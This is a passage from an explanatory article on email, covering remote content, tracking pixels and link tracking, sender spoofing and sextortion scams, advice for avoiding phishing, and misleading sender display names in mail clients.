As recommended by <a href="https://datatracker.ietf.org/doc/html/rfc5321#section-7.6"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5321</a>,
the <code>for</code> clause is skipped when there are several recipients
in the <a href="#diverging-envelope-example">envelope</a> of the message.
As a consequence, a single non-hidden recipient learns that
the message was also sent to <a href="#recipients">hidden recipients</a>
if the <code>for</code> clause is missing in the bottommost <code>Received</code> header field.
This means that the <a href="#bcc-removal">empty <code>Bcc</code> field approach</a> is used more often than intended.</li>
  <li><strong>Attachments</strong>: The <a href="#content-disposition">content disposition</a> of attachments can include information
such as when the file was created and when it was last modified.
While it can be useful to preserve such information when mailing a file,
sharing such information with the recipient can also be unexpected and undesirable.
I don’t know how mail clients can determine the preferred option without cluttering the user experience.
By default, they should err on the side of caution, which many do.</li>
</ul>

<p>Assuming that all recipients can be trusted is foolish.
If someone pretends to be interested in your work, you’ll likely reply to them.</p>

<h4 id="recipient-towards-sender">Recipient towards sender</h4>

<p>There are two ways in which the sender can <a href="https://en.wikipedia.org/wiki/Email_tracking">track the recipient</a>:
By including <a href="#remote-content">remote content</a> in the message and
by redirecting <a href="#link-tracking">external links</a>.
If the sender can trick you into replying to them
or your mail client sends a <a href="https://en.wikipedia.org/wiki/Email_tracking#Read-receipts">read receipt</a>,
then all the <a href="#sender-towards-recipients">above privacy issues</a> also apply, of course.</p>

<h5 id="remote-content">Remote content</h5>

<p><a href="#html-emails"><abbr title="HyperText Markup Language">HTML</abbr> emails</a> can include remote content,
which is fetched by the mail client when it renders the message.
Images are by far the most common type of remote content.
They are usually included with the <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/Img"><code>&lt;img&gt;</code> element</a>
or with the <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/background-image"><code>background-image</code> property</a>.
Some mail clients <a href="https://www.campaignmonitor.com/css/link-element/link-in-head/">support external style sheets</a>
through the <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/link"><code>&lt;link&gt;</code> element</a>,
but <a href="#email-styling">internal <abbr title="Cascading Style Sheets">CSS</abbr></a> can also have
<a href="https://developer.mozilla.org/en-US/docs/Web/CSS/@import"><code>@import</code> statements</a>
to load <a href="https://developer.mozilla.org/en-US/docs/Learn/CSS/Styling_text/Web_fonts">Web fonts</a>
and other styles with the <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/url()"><code>url()</code> function</a>.
There are other elements, such as <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/audio"><code>&lt;audio&gt;</code></a>,
<a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/video"><code>&lt;video&gt;</code></a>, and
<a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe"><code>&lt;iframe&gt;</code></a>,
which can also be used to include remote content, but not all mail clients support them.</p>

<figure>
  <svg id="figure-remote-content-direct-access" data-name="remote-content-direct-access" width="301.281" height="217.75" viewBox="-37.885 -1.25 301.281 217.75" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <line x1="104.427" y1="153.438" x2="174.045" y2="62.75" marker-end="url(#arrow)" stroke-dasharray="107"></line>
    <text text-anchor="start">
        <tspan x="149.04" y="126.529">2. Fetch content</tspan>
    </text>
    <line x1="104.427" y1="153.438" x2="34.809" y2="62.75" marker-end="url(#arrow)" stroke-dasharray="107"></line>
    <text text-anchor="end">
        <tspan x="59.814" y="126.529">1. Fetch email</tspan>
    </text>
    <rect x="0" y="0" width="69.618" height="61.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="34.809" y="25.65"><tspan>Mail</tspan></tspan><tspan x="34.809" y="47.65"><tspan>server</tspan></tspan>
    </text>
    <rect x="69.618" y="153.75" width="69.618" height="61.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="104.427" y="179.4"><tspan>Mail</tspan></tspan><tspan x="104.427" y="201.4"><tspan>client</tspan></tspan>
    </text>
    <rect x="139.236" y="0" width="69.618" height="61.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="174.045" y="25.65"><tspan>Web</tspan></tspan><tspan x="174.045" y="47.65"><tspan>server</tspan></tspan>
    </text>

</svg>

  <figcaption>
After fetching the email from the trusted mail server,
the mail client fetches the remote content from the untrusted web server.
</figcaption>
</figure>

<p>Remote content violates three fundamental principles of email:</p>
<ol>
  <li><strong>Offline reading</strong>: Since mail clients usually fetch the remote content only when you open the message,
substantial parts of the message can be missing when your computer is not connected to the Internet.
Since most mail clients don’t <a href="https://en.wikipedia.org/wiki/Cache_(computing)">cache</a> the remote resources,
being online when you open the message for the first time isn’t enough.</li>
  <li><strong>Immutable content</strong>: Most users probably think that
once they have received an email, the sender can no longer modify it because
your inbox contains an independent copy of the message, to which the sender has no access.
Unfortunately, this assumption doesn’t hold for <abbr title="HyperText Markup Language">HTML</abbr> emails with remote content.
Since remote content isn’t cached, different content can be provided every time you open a message.
Some clever engineers used this circumstance to include a <a href="https://www.litmus.com/blog/how-to-code-a-live-dynamic-twitter-feed-in-html-email/">dynamic Twitter feed</a> in an email.
If you’re not aware of this “feature”, though, you might fall for a scammer
who seemingly predicted the development of some market accurately.
And even if the remote content isn’t modified,
you can no longer view the original message once the sender stops hosting it.
The situation gets even worse if the domain on which the remote content is hosted is transferred to a new owner
or if the web server which hosts the remote content is compromised by an attacker.
Furthermore, remote content isn’t covered by <a href="#end-to-end-security">message signatures</a>.
In theory, some of these security issues could be addressed with a technique known as
<a href="https://en.wikipedia.org/wiki/Subresource_Integrity">subresource integrity (<abbr title="Sub-Resource Integrity">SRI</abbr>)</a>.
If the sender included the <a href="#applications-of-cryptographic-hash-functions">hash of the resource</a>
in the original message, then the resource could no longer be modified afterwards.
Unfortunately, subresource integrity is
<a href="https://www.w3.org/TR/SRI/#verification-of-html-document-subresources">specified only</a> for
<a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script"><code>&lt;script&gt;</code></a> and
<a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/link"><code>&lt;link&gt;</code></a> elements.
While a future revision of the specification might add support for integrity checks to other elements,
there are <a href="https://github.com/w3c/webappsec-subresource-integrity/issues">no plans for this yet</a>.</li>
  <li><strong>Reading privacy</strong>: Whenever your mail client fetches a remote resource,
the web server operator learns when and from where the resource has been accessed.
Since most mail clients include a
<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent"><code>User-Agent</code> header field</a>
in their <a href="https://evalapply.org/internet/#hypertext-transfer-protocol"><abbr title="HyperText Transfer Protocol">HTTP</abbr> request</a>,
the web server operator also learns which mail client you use.
For the reasons mentioned in the previous point,
senders should reference only remote content which they control.
Email newsletters often include remote content with a personalized <a href="https://en.wikipedia.org/wiki/URL"><abbr title="Uniform Resource Locator (the formal name for a web address)">URL</abbr></a>
just to track who opened the message when and from where.
Based on this data, the sender can determine what percentage of recipients opened the email,
which is known as the <a href="https://en.wikipedia.org/wiki/Open_rate">open rate</a>.
It’s important to note that your privacy when reading emails is not worse than when browsing the Web.
The crucial difference is that on the Web, you go to a website,
whereas in the case of email, the website comes to you.
Since you don’t want to provide your <abbr title="Internet Protocol">IP</abbr> address to anyone,
you should <a href="#disable-remote-content">disable remote content</a> in your mail client.</li>
</ol>

<p>In my opinion, remote content should never have been supported by mail clients.
If people insist on incorporating related files into a message,
they can use <a href="#aggregate-documents">aggregate documents</a>.
Now that remote content is used so widely,
we have to live with the above drawbacks.</p>

<details>
  <summary id="proxying-remote-content">
Proxying remote content
</summary>

  <p><a href="https://gmail.googleblog.com/2013/12/images-now-showing.html">Google</a> and
<a href="https://help.yahoo.com/kb/yahoo-mail-proxy-SLN28749.html">Yahoo</a>
proxy all remote content in their <a href="#webmail">webmail clients</a>.
Instead of letting your browser fetch the remote content directly,
these companies fetch the remote content on your behalf.
The advantage of this approach is that your <abbr title="Internet Protocol">IP</abbr> address no longer leaks to the sender of a message.
Unfortunately, Google and Yahoo fetch the remote content only when you open the email.
Thus, you still let the sender know that you’ve opened the email and when you’ve opened it.
Google seems to cache the external resources for some time.
Yahoo, on the other hand, makes another request if you force your browser to reload all content.
In order to fully protect the privacy of their users,
these companies would have to fetch and cache all remote content as soon as they receive the email.
In order not to confirm to the sender which addresses exist,
they would have to do this for all incoming messages,
even the ones with inexistent recipients
and the ones which are <a href="#heuristics">discarded as spam</a>.
Beyond fetching static content, Google also
<a href="https://developers.google.com/gmail/markup/actions/handling-action-requests">proxies the requests</a>
triggered by <a href="#dynamic-content">dynamic content</a>.
Since webmail providers have access to your emails anyway,
there is no privacy drawback when these companies fetch the remote content for you.
Desktop clients, on the other hand, can fetch emails from any mailbox provider.
If a desktop client were to use a <a href="https://en.wikipedia.org/wiki/Proxy_server">proxy server</a>
which is operated by the publisher of the client,
the publisher would learn from which server you fetch the remote content
even if the communication is <a href="https://en.wikipedia.org/wiki/End-to-end_encryption">encrypted end-to-end</a>
like in a <a href="https://en.wikipedia.org/wiki/Virtual_private_network">virtual private network (<abbr title="Virtual Private Network">VPN</abbr>)</a>.
The best solution would be to fetch all remote content through the
<a href="https://en.wikipedia.org/wiki/Tor_(anonymity_network)">Tor anonymity network</a>.
Unfortunately, I don’t know of any mail client which does this. 😞</p>

  <figure>
    <svg id="figure-remote-content-indirect-access" data-name="remote-content-indirect-access" width="355.349" height="232.5" viewBox="-123.326 -16 355.349 232.5" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <line x1="69.931" y1="30.75" x2="159.905" y2="30.75" marker-end="url(#arrow)" stroke-dasharray="83"></line>
    <text text-anchor="middle">
        <tspan x="115.386" y="-3.25">3. Fetch</tspan><tspan x="115.386" y="18.75">content</tspan>
    </text>
    <line x1="34.809" y1="153.438" x2="34.809" y2="62.75" marker-end="url(#arrow)" stroke-dasharray="84"></line>
    <text text-anchor="start">
        <tspan x="46.809" y="113.525">2. Fetch content</tspan>
    </text>
    <line x1="34.809" y1="153.438" x2="-69.618" y2="62.75" marker-end="url(#arrow)" stroke-dasharray="131"></line>
    <text text-anchor="end">
        <tspan x="-25.627" y="128.347">1. Fetch email</tspan>
    </text>
    <rect x="-104.427" y="0" width="69.618" height="61.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="-69.618" y="25.65"><tspan>Mail</tspan></tspan><tspan x="-69.618" y="47.65"><tspan>server</tspan></tspan>
    </text>
    <rect x="0" y="0" width="69.618" height="61.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="34.809" y="25.65"><tspan>Proxy</tspan></tspan><tspan x="34.809" y="47.65"><tspan>server</tspan></tspan>
    </text>
    <rect x="0" y="153.75" width="69.618" height="61.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="34.809" y="179.4"><tspan>Mail</tspan></tspan><tspan x="34.809" y="201.4"><tspan>client</tspan></tspan>
    </text>
    <rect x="161.155" y="0" width="69.618" height="61.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="195.964" y="25.65"><tspan>Web</tspan></tspan><tspan x="195.964" y="47.65"><tspan>server</tspan></tspan>
    </text>

</svg>

    <figcaption>
How remote content can be fetched via a proxy server in order to protect the user’s privacy to some degree.
</figcaption>
  </figure>

</details>

<details>
  <summary id="disable-remote-content">
How to disable remote content
</summary>

  <p>If you care about your privacy, you should allow remote content only from trusted senders.
Here is how you disable remote content in various mail clients
(where some of them have remote content disabled by default):</p>
  <ul>
    <li><a href="https://support.google.com/mail/answer/145919"><strong>Gmail</strong></a>:
All settings &gt; General &gt; Images &gt; Ask before displaying external images</li>
    <li><a href="https://help.yahoo.com/kb/SLN5043.html"><strong>Yahoo</strong></a>:
More settings &gt; Viewing email &gt; Show images in messages &gt; Ask before showing external images</li>
    <li><a href="https://support.mozilla.org/en-US/kb/remote-content-in-messages"><strong>Thunderbird</strong></a>:
Preferences &gt; Privacy &amp; Security &gt; Mail Content &gt; Allow remote content in messages [disabled by default]</li>
    <li><strong>Apple Mail</strong>:
      <ul>
        <li><strong>Mobile</strong>: Settings &gt; Mail &gt; Messages &gt; Privacy Protection &gt; Block All Remote Content</li>
        <li><a href="https://support.apple.com/guide/mail/change-privacy-settings-mlhlae4a4fe6/15.0/mac/13.0"><strong>Desktop</strong></a>:
Preferences &gt; Privacy &gt; Block All Remote Content</li>
      </ul>
    </li>
    <li><strong>Outlook</strong>:
      <ul>
        <li><a href="https://support.microsoft.com/en-us/office/external-image-protection-in-outlook-com-43c0c17e-8fd1-41c6-93fe-ffe54638e82b"><strong>Web</strong></a>:
View all Outlook settings &gt; General &gt; External images &gt; Always use the Outlook service to load images</li>
        <li><a href="https://support.microsoft.com/en-us/office/block-or-unblock-automatic-picture-downloads-in-email-messages-15e08854-6808-49b1-9a0a-50b81f2d617a"><strong>Desktop</strong></a>:
File &gt; Options &gt; Trust Center &gt; Trust Center Settings or Automatic Download &gt; Don’t download pictures automatically in <abbr title="HyperText Markup Language">HTML</abbr> e-mail messages or RSS items [enabled by default]</li>
      </ul>
    </li>
  </ul>

  <p>Afterwards, you can test your mail client with <a href="https://www.emailprivacytester.com/">emailprivacytester.com</a>.
After verifying your address, you get an email with 40 different types of remote content,
and you can observe in real time which ones are fetched by your client.</p>

</details>

<h5 id="link-tracking">Link tracking</h5>

<p>Emails often contain links to websites.
Instead of linking to the target site directly,
the sender can rewrite the link in such a way
that your <a href="https://en.wikipedia.org/wiki/Web_browser">web browser</a> sends a request to their tracking server,
which in turn redirects your browser to the actual <a href="https://en.wikipedia.org/wiki/Web_server">web server</a>:</p>

<figure>
  <svg id="figure-link-tracking" data-name="link-tracking" width="466.66400000000004" height="217.75" viewBox="-25.718 -1.25 466.66400000000004 217.75" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <line x1="263.23" y1="184.5" x2="396.627" y2="62.75" marker-end="url(#arrow)" stroke-dasharray="174"></line>
    <text text-anchor="start">
        <tspan x="338.364" y="143.672">5. Request</tspan>
    </text>
    <line x1="225.848" y1="61.813" x2="225.848" y2="152.5" marker-end="url(#arrow)" stroke-dasharray="84"></line>
    <text text-anchor="start">
        <tspan x="237.848" y="113.525">4. Redirect</tspan>
    </text>
    <line x1="213.848" y1="153.438" x2="213.848" y2="62.75" marker-end="url(#arrow)" stroke-dasharray="84"></line>
    <text text-anchor="end">
        <tspan x="201.848" y="113.525">3. Request</tspan>
    </text>
    <line x1="86.451" y1="184.5" x2="175.529" y2="184.5" marker-end="url(#arrow)" stroke-dasharray="82"></line>
    <text text-anchor="middle">
        <tspan x="131.459" y="172.5">2. Open</tspan>
    </text>
    <line x1="43.069" y1="153.438" x2="43.069" y2="62.75" marker-end="url(#arrow)" stroke-dasharray="84"></line>
    <text text-anchor="end">
        <tspan x="31.069" y="113.525">1. Fetch</tspan>
    </text>
    <rect x="0" y="0" width="86.138" height="61.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="43.069" y="25.65"><tspan>Mail</tspan></tspan><tspan x="43.069" y="47.65"><tspan>server</tspan></tspan>
    </text>
    <rect x="0" y="153.75" width="86.138" height="61.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="43.069" y="179.4"><tspan>Mail</tspan></tspan><tspan x="43.069" y="201.4"><tspan>client</tspan></tspan>
    </text>
    <rect x="176.779" y="153.75" width="86.138" height="61.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="219.848" y="179.4"><tspan>Web</tspan></tspan><tspan x="219.848" y="201.4"><tspan>browser</tspan></tspan>
    </text>
    <rect x="176.779" y="0" width="86.138" height="61.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="219.848" y="25.65"><tspan>Tracking</tspan></tspan><tspan x="219.848" y="47.65"><tspan>server</tspan></tspan>
    </text>
    <rect x="353.558" y="0" width="86.138" height="61.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="396.627" y="25.65"><tspan>Web</tspan></tspan><tspan x="396.627" y="47.65"><tspan>server</tspan></tspan>
    </text>

</svg>

  <figcaption>
How clicks on links can be tracked by the sender of a message.
In general, you cannot trust the servers in orange.
</figcaption>
</figure>

<p>Unlike <a href="https://en.wikipedia.org/wiki/Web_beacon">tracking pixels</a>,
link tracking also works in plaintext emails and when remote content is disabled.
If the target website isn’t identifiable in the tracking link,
you have no other choice than to request its address from the tracking server
if you really want to see the advertised content.
The sender can use tracking links to measure what percentage of recipients opened the link,
which is known as the <a href="https://en.wikipedia.org/wiki/Click-through_rate">click-through rate (<abbr title="Click-Through Rate">CTR</abbr>)</a>.
The same technique is often used on <a href="https://en.wikipedia.org/wiki/Social_media">social media</a>
in combination with <a href="https://en.wikipedia.org/wiki/URL_shortening"><abbr title="Uniform Resource Locator (the formal name for a web address)">URL</abbr> shortening</a>
to determine the reach of a post.</p>

<p>Since seeing is believing, I wrote a little <a href="https://github.com/KasparEtter/email-tracker">tool to track emails</a>.
You can generate a unique token and then subscribe to the associated events below.
You can send the tracking link and the tracking image to someone
using your mail client or the <a href="#esmtp-tool"><abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr> tool</a> above.
I’ve deployed the tracking server on <a href="https://render.com/">render.com</a>.
As you can see in <a href="https://github.com/KasparEtter/email-tracker/blob/main/main.ts">its source code</a>,
my server doesn’t keep any records.
While Render probably logs your requests, I don’t have access to such logs.
Since I use the free tier, the <a href="https://en.wikipedia.org/wiki/WebSocket">WebSocket</a> used to subscribe to the events
is closed <a href="https://community.render.com/t/node-js-websocket-connections-closing-after-5-minutes/4500/3">after 5 minutes</a>,
which is hopefully enough for the purpose of this demonstration.
In order to determine <a href="https://evalapply.org/internet/#ip-geolocation">where a request was made from</a>,
the tool uses the free <abbr title="Application Programming Interface">API</abbr> from <a href="https://ipinfo.io/">ipinfo.io</a>.
You can also use the tool to see from where social media apps request a site to generate the link preview
or to convince yourself that the <a href="https://www.torproject.org/download/">Tor browser</a>
indeed connects from a different location each time.</p>



<h3 id="security">Security</h3>

<p>Security and the lack thereof have been a topic throughout this article.
In this section, I shine a light on some additional aspects.</p>

<h4 id="spoofing">Spoofing</h4>

<p>As we saw <a href="#tool-instructions">earlier</a>,
the sender of an email can easily be <a href="https://en.wikipedia.org/wiki/Email_spoofing">spoofed</a>
because at least historically emails aren’t authenticated.
Somewhat frustratingly, <a href="https://datatracker.ietf.org/doc/html/rfc5321#section-7.1"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5321</a>
and <a href="#spoofed-sender-during-submission">some companies</a>
see forged sender addresses more as a feature than as a bug.
Criminals abuse this “feature” to trick unsuspecting users into performing actions or disclosing information,
which they wouldn’t do otherwise.
Exploiting the credulity of people is known as
<a href="https://en.wikipedia.org/wiki/Social_engineering_(security)">social engineering</a>.
Besides impersonating a trusted organization for <a href="#phishing">phishing</a>,
a common attack is to send a victim an email which seemingly comes from their own address.
In the message, the attacker claims that they’ve compromised the victim’s computer
and that they’ve recorded the victim masturbating to porn.
The attacker threatens to send the recording to all the victim’s contacts unless they receive a payment,
usually in <a href="https://en.wikipedia.org/wiki/Bitcoin">bitcoin</a>, within a couple of days.
This form of <a href="https://en.wikipedia.org/wiki/Blackmail">blackmailing</a>
is known as <a href="https://en.wikipedia.org/wiki/Sextortion">sextortion</a>.
If you receive such an email yourself, how do you know that the attacker’s claim is wrong?
First of all, you know now that the sender address of emails can easily be forged
and that there is no reason to assume that your account has been compromised.
But more importantly, if there was an easy way to increase the fraction of people who pay the ransom,
criminals would certainly make use of it.
In the case of sextortion, they would just have to include a screenshot of the recording
and the addresses of some contacts to make presumably the large majority of people pay.
Given that this is (usually) not the case, there’s no reason to worry.
Do people fall for this crap? The answer is yes, unfortunately.
The first time I received such a message was on 13 January 2019.
The fraudster demanded 356 <a href="https://en.wikipedia.org/wiki/Euro">euro</a> in bitcoin to remain silent
and was stupid enough to provide the
<a href="https://blockchair.com/bitcoin/address/18Pt4B7Rz7Wf491FGQHPsfDeKRqnkyrMo6">same Bitcoin address</a> to several victims.
Since all Bitcoin transactions are public, we know exactly how much money they made:
5.379 <abbr title="Bitcoin">BTC</abbr>, which was worth around 20’000 <abbr title="US Dollar">USD</abbr> at the time.
This also means that they had no way to know who of their victims actually paid,
which made their threat even less credible to anyone who has a basic understanding of
<a href="https://en.wikipedia.org/wiki/Blockchain">blockchains</a>.</p>

<p>Besides social engineering, spoofed sender addresses can be abused
where emails are <a href="https://cr.yp.to/docs/mailabuse.html">used for authentication</a>.
For example, people can often unsubscribe from <a href="#mailing-list">mailing lists</a> via email.
Even if this is not the case, many mailing lists remove subscribers
to whom several messages in a row couldn’t be delivered automatically.
Unless a mailing list uses unpredictable <a href="#bounce-messages">variable envelope return paths (<abbr title="Variable Envelope Return Path">VERP</abbr>)</a>,
<a href="#bounce-messages">bounce messages</a> can easily be forged,
which means that you can unsubscribe other people from the mailing list.
Similarly, it’s often the case that only approved senders can send a message to all subscribers of a mailing list.
Anyone who knows how to spoof emails can easily bypass this restriction and spam the mailing list.</p>

<p>Email address spoofing can be prevented by enforcing <a href="#domain-authentication">domain authentication</a>,
which I’ll cover in the last chapter of this article.</p>

<h4 id="phishing">Phishing</h4>

<p>Impersonating a trusted organization to obtain sensitive information or payments from gullible users
is known as <a href="https://en.wikipedia.org/wiki/Phishing">phishing</a>.
Phishing emails often direct their victims to a fraudulent website
which looks exactly like the legitimate website.
By providing a pretext, the attacker tries to get the victims to perform a specific action,
such as entering their username and password or initiating a payment with their credit card.
Phishing attacks can target specific individuals or a diverse group of people.
If they’re not just an <a href="https://en.wikipedia.org/wiki/Advance-fee_scam">advance-fee scam</a>,
they usually require some technical skills to execute them.
This is why most phishing attacks are motivated by financial gain
rather than a desire to harass or stalk the victim.
While requesting a payment leads to a direct success for the criminals,
usernames and passwords can be used to launch further attacks from the victim’s account.
For example, the credentials of an employee can be used to infiltrate a company
in order to obtain <a href="https://en.wikipedia.org/wiki/Trade_secret">trade secrets</a>
or to install <a href="https://en.wikipedia.org/wiki/Ransomware">ransomware</a> on their computers.</p>

<p>Phishing attacks come in all shapes and sizes,
but you can reduce your risk by sticking to the following principles:</p>
<ul>
  <li><strong>Always be suspicious</strong>: If an email prompts you to perform a certain action, your alarm bells should ring.
Have you been prompted for similar actions before?
Is the time frame to perform the action unusually short?
Is there a reasonable default option if you don’t perform the action?
Does the action involve the disclosure of sensitive information or a payment?</li>
  <li><strong>Don’t click on links</strong>: Phishing attacks require that you take the bait.
Create a <a href="https://en.wikipedia.org/wiki/Bookmark_(digital)">bookmark</a>
for all the websites where you have an account.
Make it a habit to navigate to these websites yourself instead of following links.
If an email says that a subscription is about to expire,
log in to the website of the service provider with the bookmark and not the link.
Using a bookmark (or a search engine) to navigate to a website
is better than relying on the address autocompletion of your browser.
If you clicked on a dubious link by mistake in the past,
the fraudulent <abbr title="Uniform Resource Locator (the formal name for a web address)">URL</abbr> is still in your browser’s history
and you may not be able to <a href="#homograph-attack">recognize it as such</a>.</li>
  <li><strong>Hover over links</strong>: If you can’t suppress your urge to click on a link,
move your mouse over the link first and verify whether the <a href="https://en.wikipedia.org/wiki/Status_bar">status bar</a>
at the bottom of the window indeed displays the address you want to visit.
You should always do this because the text of a link can be misleading.
For example, <a href="https://www.bing.com/">www.google.com</a> takes you to
<a href="https://en.wikipedia.org/wiki/Microsoft_Bing">Bing</a>, not <a href="https://en.wikipedia.org/wiki/Google_Search">Google</a>.
You should check the destination of a link before you click on it.
If you check the destination of a link only in the opened browser window,
you have already confirmed to the attacker that you <a href="#link-tracking">click on links</a>,
and the visited website might have already infected your computer
with <a href="https://en.wikipedia.org/wiki/Malware">malware</a>.
Unfortunately, <a href="#link-tracking">link tracking</a> can make it quite difficult to recognize
whether the destination of a link is legitimate.
Furthermore, not all companies prime their users to trust only a single domain.
For example, <a href="https://en.wikipedia.org/wiki/PayPal">PayPal</a>, of all companies,
directs their users to <code>paypal-communication.com</code> instead of <code>paypal.com</code>
when informing them about changes to the general terms and conditions.
Additionally, <a href="#homograph-attack">homograph attacks</a> can make it difficult
or even impossible to recognize that the target domain is not the legitimate one.
This is one more reason why you shouldn’t click on links in the first place.
The only exception to this rule are links to articles on which you won’t perform any actions.
However, this means that you have to remember for each tab of your browser
whether the address came from a trusted or an untrusted source.
Anything you open on an untrusted page can also not be trusted.
Some mail clients, such as Apple Mail, don’t have a status bar
and show the destination address in a <a href="https://en.wikipedia.org/wiki/Tooltip">tooltip</a> instead.
And yes, Apple Mail is smart enough to override any tooltips that a sender provided
with the <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/title"><code>title</code> attribute</a>.
I’ve tested this.</li>
  <li><strong>Use a password manager</strong>: Seriously.
<a href="https://en.wikipedia.org/wiki/Password_manager">Password managers</a> not only allow you
to have a long, randomly-generated password for each website,
they also prevent you from entering them on the wrong websites.
To be precise, you can still paste your passwords into any input fields you like.
Password managers just won’t do this for you if the domain is different.
This is just <a href="https://en.wikipedia.org/wiki/Defense_in_depth_(computing)">one more level of defense</a>,
which is especially useful for innocuous-looking actions that don’t trigger your alarm bells.
For example, some websites require you to log in before you can unsubscribe from their newsletter,
and such an email and login can be bogus, of course.</li>
  <li><strong>Verify the sender</strong>: Who sent you the email?
Since the sender of an email can (<a href="#domain-authentication">still</a>) be <a href="#spoofing">spoofed</a>,
a trusted sender shouldn’t lower your level of suspicion much.
If the domain in the <code>From</code> address doesn’t belong to the impersonated organization, though,
you should almost certainly ignore and delete the message.
Mail clients could do way more to protect their users from phishing attacks.
For example, changing the policy for incoming emails from “allowed unless blocked”
to <a href="#spam">“blocked unless allowed”</a> would likely help a lot in shifting the mindset of users.
Mail clients could also display the <a href="#sender-towards-recipients">country of origin</a> for each message,
warn the user if the message isn’t <a href="#domain-authentication">authenticated</a>
or if the clicked link leads to a domain which is different from the <code>From</code> address, etc.</li>
  <li><strong>Disable display names</strong>: While spoofing sender addresses
can be prevented by <a href="#domain-authentication">technical means</a>,
the sender can choose their <a href="#display-name">display name</a> at will.
Since sender-chosen means attacker-chosen,
users shouldn’t be confronted with unverified display names.
Unfortunately, all the mail clients I’ve checked handle this aspect so badly
that I had to write a <a href="#malicious-display-names">separate box</a> on this topic.</li>
  <li><strong>Confirm out-of-band</strong>: If a known sender asks you to perform an action
which has far-reaching or irreversible consequences,
contact the sender through a different communication channel
and let them confirm the request before executing it.
Obeying orders blindly is dangerous from a security perspective,
and subordinates should be trained and encouraged to question them.</li>
</ul>

<details>
  <summary id="malicious-display-names">
Malicious display names
</summary>

  <p>In my opinion, the sender’s <a href="#display-name">display name</a> should be used
as the suggested name only when the recipient adds the sender’s address to their address book.
Since the sender can choose any display name they want, it shouldn’t be displayed anywhere else.
Unfortunately, I’m not aware of any mail client which handles the display name like this.
<a href="https://en.wikipedia.org/wiki/Gmail">Gmail</a>,
<a href="https://en.wikipedia.org/wiki/Outlook.com">Outlook.com</a>,
<a href="https://en.wikipedia.org/wiki/Yahoo!_Mail">Yahoo! Mail</a>,
<a href="https://en.wikipedia.org/wiki/Apple_Mail">Apple Mail</a>,
and <a href="https://en.wikipedia.org/wiki/Mozilla_Thunderbird">Mozilla Thunderbird</a>
even show only the sender’s display name without the sender’s email address in the inbox view.
Thunderbird and Apple Mail on iOS, however, do show the sender’s email address in angle brackets
if the sender’s display name is an email address.
In the other clients, the user cannot tell whether the displayed address
is the sender’s email address or the sender’s display name.
You can test this by entering something like <code>&#34;bob@example.com&#34; &lt;alice@example.org&gt;</code>
in the <code>From</code> field of the <a href="#esmtp-tool"><abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr> tool</a>.
Please note that you have to quote the display name if you use periods or the @ symbol in it.
Once you open the message, most mail clients also display the sender’s email address.
In Apple Mail, you have to disable “Use Smart Addresses” under “Viewing” in “Settings”
for the client to even show you the sender’s email address.
On iOS, <a href="https://apple.stackexchange.com/questions/394073/how-can-i-disable-smart-addresses-in-the-mail-app-on-ios-ipados">this option doesn’t even exist</a>.
If you want to see who actually sent you a message, you have to click on the sender’s display name.
Since we humans tend to <a href="https://en.wikipedia.org/wiki/Confirmation_bias">confirm what we already think</a>
rather than to question our initial assumptions and beliefs,
the behavior of these mail clients seems reckless to me.
Many users might not check the sender’s email address
when they think that they already know who the sender is based on the message overview screen.</p>

  <p>The very least that mail clients should do to prevent phishing attacks
is to show a warning if a known display name is used by an unknown sender.
I have seen this only in the Gmail web interface so far.
For some reasons, I can no longer replicate this, though.</p>

  <figure>
    <p><img src="https://evalapply.org/pages/email/generated/gmail-phishing-warning.png"/>
    

</p>

    <figcaption>How Gmail warns its users when a known display name is used by an unknown sender.</figcaption>

  </figure>

</details>

<h4 id="confidentiality-and-integrity">Confidentiality and integrity</h4>

<p>As we saw <a href="#tls-deployment-statistics">earlier</a>, the percentage of emails
which are encrypted and authenticated in transit increased significantly over the last decade.
When you send an email, though, there is no guarantee
that the confidentiality and integrity of your message is protected
when it is relayed from your outgoing mail server to the incoming mail server of the recipient.
This is especially problematic when email is used to perform security-critical operations,
such as <a href="https://en.wikipedia.org/wiki/Self-service_password_reset#Email_or_phone_based_resets">password resets</a>.
Due to backward compatibility, the <a href="#protocols">email protocols</a>
are secure only against <a href="#implicit-tls-versus-explicit-tls">passive attackers</a>.
I will cover the efforts to make email secure against active attackers in the <a href="#transport-security">last chapter</a>.
In my opinion, mail clients should warn their users if the incoming mail server of one of the recipients
doesn’t support <a href="#transport-security">strict transport security</a>.
You can increase the pressure on mailbox providers only by increasing the awareness of users.</p>

<p>Gmail provides an easy way to see whether a received message has been authenticated and encrypted in transit,
which allows users to assess the authenticity and, <a href="#reporting-in-header-fields">somewhat misleadingly</a>,
